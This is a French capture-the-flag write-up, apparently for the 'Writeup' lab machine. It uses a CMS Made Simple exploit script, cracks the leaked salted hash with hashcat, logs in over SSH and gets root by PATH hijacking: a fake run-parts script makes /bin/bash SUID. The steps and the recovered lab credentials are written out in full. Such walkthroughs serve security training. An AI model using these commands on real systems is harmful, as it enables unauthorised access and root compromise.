
![[writeup logo.png]]


![Pasted image 20251014224137](Image/Pasted%20image%2020251014224137.png)

![Pasted image 20251014224804](Image/Pasted%20image%2020251014224804.png)

```
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
```

```
python3 46635.py -u http://10.10.10.138/writeup 
[+] Salt for password found: 5a599ef579066807 
[+] Username found: jkr 
[+] Email found: jkr@writeup.htb 
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```
On met le hash dans hashcat comme ceci hash:salt 

```
hashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt
```

Et on trouve `raykayjay9`

On peut alors se log via ssh au user jkr

```
ssh jkr@10.129.90.20
```

On récupère le flag user.txt

![Pasted image 20251015000219](Image/Pasted%20image%2020251015000219.png)

On commence par énumérer nos groupes avec la commandes `id` et on remarque l'on fait partie du groupe (staff)

```
jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
```

Ce groupe nous donne le droit d'écriture sur le dossier `/usr/local/bin` selon la Documentation Debian

Puis ce dossier fais partie de l'environnement $PATH **root**, cela veut dire que l'on peut remplacer un programme que l'user root lancerait pour l'une de ses tâches, en y insérant notre payload.

Pour voir l'activité de root, on téléverse l'outil `pspy32` sur la cible via scp

```
scp pspy32 jkr@10.129.90.20:/home/jkr
```
On lui donne les droit d'éxécution

```
chmod +x pspy32
```
```
.pspy32
```

On laisse tourner puis on se connecte via ssh dans un autre terminal et on remarque ceci

![Pasted image 20251015001917](Image/Pasted%20image%2020251015001917.png)

L'user **root** lance le binaire `run-parts` depuis le **PATH** /usr/bin/local

On peut donc faire un **PATH Hijacking** sur ce binaire pour obtenir un shell root !

Pour cela on créé notre binaire contenant notre payload en remplacant le binaire `run-parts`

```
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /usr/local/bin/run-parts && chmod +x /usr/local/bin/run-parts
```

Ceci rajoute le binaire SUID à /bin/bash et ajoute le droit d'exécution au binaire créé

On se déconnecte de notre session ssh et on remarque que notre shell a changé

Il suffit d'exécuter la commande 

```
/bin/bash -p 
```

Pour être root !

![Pasted image 20251015002447](Image/Pasted%20image%2020251015002447.png)

